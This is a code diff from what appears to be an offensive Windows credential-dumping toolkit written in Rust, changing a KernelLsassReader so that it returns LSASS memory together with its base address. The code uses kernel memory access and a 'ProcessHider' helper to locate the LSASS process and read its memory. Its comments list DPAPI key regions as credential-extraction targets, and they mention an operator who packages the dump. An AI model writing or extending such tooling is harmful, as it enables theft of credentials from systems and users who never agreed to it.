@@ -461,6 +461,15 @@ impl KernelLsassReader {
 
 impl CredKit for KernelLsassReader {
     fn dump_lsass(&self, krw: &dyn KernelRw, pid: u32) -> Result<Vec<u8>, KitError> {
+        // Delegate to dump_lsass_with_base; the bytes are the same.
+        self.dump_lsass_with_base(krw, pid).map(|(b, _)| b)
+    }
+
+    fn dump_lsass_with_base(
+        &self,
+        krw: &dyn KernelRw,
+        pid: u32,
+    ) -> Result<(Vec<u8>, u64), KitError> {
         // 1. Resolve LSASS's EPROCESS by walking PsActiveProcessHead.
         if self.ps_active_process_head_kva == 0 {
             return Err(KitError::UnsupportedPosture(
@@ -470,11 +479,9 @@ impl CredKit for KernelLsassReader {
         }
         let eprocess_kva =
             ProcessHider::find_eprocess(krw, self.ps_active_process_head_kva, pid, &self.offsets)?;
-        // 2. Read the LSASS user-mode VA range. The minidump assembly
-        // (exception records, thread stacks, handles, module list) is
-        // operator-assembled from the raw memory read. This method
-        // returns the raw memory; the operator packages it into a
-        // minidump format at the call site.
+        // 2. Read the LSASS user-mode VA range. The raw bytes are returned;
+        // the operator wraps them in a minidump envelope at the call site
+        // (crates/minidump-assembler) using the base VA returned here.
         //
         // Typical LSASS read targets (for credential extraction):
         // - LsaEncryptMemory / LsaEncryptMemoryExportTable (DPAPI keys)
@@ -494,7 +501,8 @@ impl CredKit for KernelLsassReader {
                 )
             })?;
         let read_size: usize = 0x10_0000; // 1 MiB initial read
-        Self::read_process_mem(krw, eprocess_kva, user_mode_base, read_size)
+        let bytes = Self::read_process_mem(krw, eprocess_kva, user_mode_base, read_size)?;
+        Ok((bytes, user_mode_base as u64))
     }
 }
 
